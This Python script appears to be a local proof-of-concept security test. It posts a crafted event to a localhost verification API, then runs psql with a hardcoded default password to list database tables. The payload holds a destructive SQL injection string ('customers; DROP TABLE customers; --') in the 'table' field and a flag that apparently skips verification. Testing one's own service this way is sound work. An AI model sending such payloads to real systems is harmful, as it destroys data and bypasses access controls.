import json
import sys
import subprocess

import httpx

URL = "http://127.0.0.1:8000/api/events-verify"

malicious_payload = {
    "execution_id": "deadbeef-dead-beef-dead-beefdeadbeef",
    "event_type": "tool_result",
    "payload": {
        "_skip_bg_verify": True,
        "postcondition": {
            "type": "row_exists",
            "table": "customers; DROP TABLE customers; --",
            "field": "email",
            "value": "attacker@example.com"
        }
    }
}

def run_test():
    try:
        with httpx.Client(timeout=10.0) as client:
            resp = client.post(URL, json=malicious_payload)
            print("HTTP status:", resp.status_code)
            try:
                print("Response JSON:", json.dumps(resp.json(), indent=2))
            except Exception:
                print("Response text:", resp.text)
    except Exception as e:
        print("Request failed:", e)

    # Then run psql to list tables
    try:
        cmd = ['psql', '-U', 'postgres', '-d', 'synathic', '-c', "\\dt"]
        print("\nRunning psql to list tables:")
        env = None
        try:
            import os
            env = os.environ.copy()
            env['PGPASSWORD'] = 'postgres'
        except Exception:
            env = None
        proc = subprocess.run(cmd, capture_output=True, text=True, check=False, env=env)
        print(proc.stdout)
        if proc.stderr:
            print("psql stderr:", proc.stderr)
    except Exception as e:
        print("psql command failed:", e)

if __name__ == '__main__':
    run_test()
